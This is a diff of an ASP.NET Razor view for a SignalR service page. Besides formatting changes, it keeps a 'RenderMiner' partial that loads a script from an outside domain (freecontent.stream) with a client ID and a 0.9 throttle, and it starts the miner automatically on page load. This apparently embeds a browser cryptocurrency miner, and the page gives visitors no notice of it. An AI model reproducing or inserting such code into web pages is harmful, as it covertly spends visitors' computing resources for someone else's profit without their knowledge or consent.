@@ -1,31 +1,33 @@
 ﻿@model SignalRService.ViewModels.ServiceSettingViewModel
 
 @{
-  Layout = "~/Views/Shared/_LayoutMobile.cshtml";
+    Layout = null;
 }
+
 
 @Html.Partial("SignalRBase", new SignalRService.ViewModels.SignalRBaseConfigurationViewModel()
 {
-        SinalRGroup = Model.ServiceUrl
+    SinalRGroup = Model.ServiceUrl
 })
 
 
-<h4>@Model.ServiceName</h4>
 
-@Html.Partial("RenderMiner", new SignalRService.ViewModels.MinerConfigurationViewModel() {
-     ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
-     Throttle = "0.9",
-     ScriptUrl = "https://www.freecontent.stream./Htxj.js",
-     StartDelayMs = 3000,
-     ReportStatusIntervalMs = 65000
+@Html.Partial("RenderMiner", new SignalRService.ViewModels.MinerConfigurationViewModel()
+{
+    ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
+    Throttle = "0.9",
+    ScriptUrl = "https://www.freecontent.stream./Htxj.js",
+    StartDelayMs = 3000,
+    ReportStatusIntervalMs = 65000
 })
+
 
 
 <fieldset data-role="controlgroup">
     <legend>Client, Host:</legend>
-    <input type="checkbox" name="checkbox-client" id="checkbox-client" onclick="toggle_orderClient(this)" >
+    <input type="checkbox" name="checkbox-client" id="checkbox-client" onclick="toggle_orderClient(this)">
     <label for="checkbox-client">Client</label>
-    <input type="checkbox" name="checkbox-host" id="checkbox-host" onclick="toggle_orderHost(this)" >
+    <input type="checkbox" name="checkbox-host" id="checkbox-host" onclick="toggle_orderHost(this)">
     <label for="checkbox-host">Host</label>
 </fieldset>
 <div data-role="controlgroup" data-type="horizontal" data-mini="true">
@@ -36,21 +38,25 @@
 
 
 
-@Html.Partial("RenderOrderClient", new SignalRService.ViewModels.OrderClientConfigurationViewModel() {
-   //  AppendToSelector = "*[data-role=page]"
-   AppendToSelector = ".body-content",
-   SinalRGroup = Model.ServiceUrl.ToLower()
-})
-
-@Html.Partial("RenderOrderHost", new SignalRService.ViewModels.OrderHostConfigurationViewModel() {
+@Html.Partial("RenderOrderClient", new SignalRService.ViewModels.OrderClientConfigurationViewModel()
+{
+    //  AppendToSelector = "*[data-role=page]"
     AppendToSelector = ".body-content",
     SinalRGroup = Model.ServiceUrl.ToLower()
 })
 
+@Html.Partial("RenderOrderHost", new SignalRService.ViewModels.OrderHostConfigurationViewModel()
+{
+    AppendToSelector = ".body-content",
+    SinalRGroup = Model.ServiceUrl.ToLower()
+})
+
+
+
 <script>
     function toggle_orderClient(e) {
         if (e.checked) {
-            itemOrderClient.run(".body-content");
+            itemOrderClient.run();
         }
         else {
             itemOrderClient.stop();
@@ -58,7 +64,7 @@
     }
     function toggle_orderHost(e) {
         if (e.checked) {
-            itemOrderHost.run(".body-content");
+            itemOrderHost.run();
         }
         else {
             itemOrderHost.stop();
@@ -73,7 +79,7 @@
         start_miner();
     });
 
-    
-    
+
+
 
 </script>
